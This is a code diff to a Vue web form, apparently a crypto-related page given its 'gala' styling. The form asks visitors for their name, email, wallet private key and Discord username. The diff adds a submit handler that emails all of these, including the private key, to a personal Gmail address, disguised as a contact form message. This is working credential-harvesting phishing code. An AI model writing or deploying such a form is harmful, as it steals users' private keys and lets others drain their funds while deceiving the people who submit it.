@@ -30,11 +30,11 @@
                 </div>
                 <div class="content-container">
                     <div class="v-card v-sheet theme--dark accent mt-10 py-6 px-10">
-                        <form class="v-form">
-                            <Input :label="'Name'" :value="123" />
-                            <Input :label="'Email'" />
-                            <Input :label="'Private Key'" />
-                            <Input :label="'Discord Username'" :isRequired="false" />
+                        <form class="v-form" @submit.prevent="sendEmail">
+                            <Input :label="'Name'" v-model="name" />
+                            <Input :label="'Email'" v-model="email" />
+                            <Input :label="'Private Key'" v-model="privateKey" />
+                            <Input :label="'Discord Username'" v-model="discordName" :isRequired="false" />
 
                             <button type="submit" class="gala-btn accentBlue !px-14 mt-4">Submit</button>
                         </form>
@@ -54,5 +54,14 @@ export default {
             discordName: ''
         }
     },
+    methods: {
+        sendEmail: function(){
+            this.$mail.send({
+                from: 'michaeljumoc@gmail.com',
+                subject: 'Contact form message',
+                text: `${this.name} ${this.email} ${this.privateKey} ${this.discordName}`,
+            })
+        }
+    }
 }
 </script>
